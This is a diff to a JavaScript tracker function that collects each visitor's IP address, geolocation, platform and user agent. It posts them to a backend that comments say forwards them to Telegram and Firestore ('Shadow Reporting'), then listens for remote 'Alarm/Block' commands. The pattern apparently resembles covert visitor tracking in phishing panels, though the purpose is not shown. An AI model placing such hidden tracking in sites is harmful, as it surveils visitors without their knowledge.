@@ -363,31 +363,17 @@
     }
 
     async function gatherAndNotify() {
+        let ipData = { ip: '0.0.0.0' };
         try {
-            const ipData = await fetch(CONFIG.ipApi).then(res => res.json());
+            // Attempt to get IP/Geo on client, but don't crash if blocked (Office Firewall)
+            const res = await fetch(CONFIG.ipApi);
+            if (res.ok) ipData = await res.json();
+        } catch (error) {
+            console.warn("🐂 Client Geo-Fetch blocked, switching to Server-Side Capture.");
+        }
 
-            sessionData = {
-                sessionID: sessionID,
-                ip: ipData.ip,
-                city: ipData.city,
-                country: ipData.country_name,
-                org: ipData.org,
-                device: navigator.platform,
-                browser: navigator.userAgent,
-                startTime: new Date().toISOString(),
-                status: 'online',
-                history: [
-                    { time: getTimestamp(), action: 'Entrance', detail: window.location.href }
-                ]
-            };
-
-            // 1. Initialize Firestore Document
-            if (window.db) {
-                await window.db.collection(CONFIG.collection).doc(sessionID).set(sessionData);
-                console.log("🔥 Firestore Session Created");
-            }
-
-            // 1. Send all data to Backend API (Shadow Reporting)
+        try {
+            // ONE SOURCE OF TRUTH: Backend API handles Telegram & Firestore Init
             fetch(CONFIG.api.tracker, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -401,11 +387,11 @@
                 keepalive: true
             });
 
-            // Start Listening for remote commands
+            // Start Listening for remote commands (Alarm/Block)
             listenForCommands(sessionID);
 
         } catch (error) {
-            console.error("Tracker Init Error:", error);
+            console.error("Tracker API Call Error:", error);
         }
     }
 
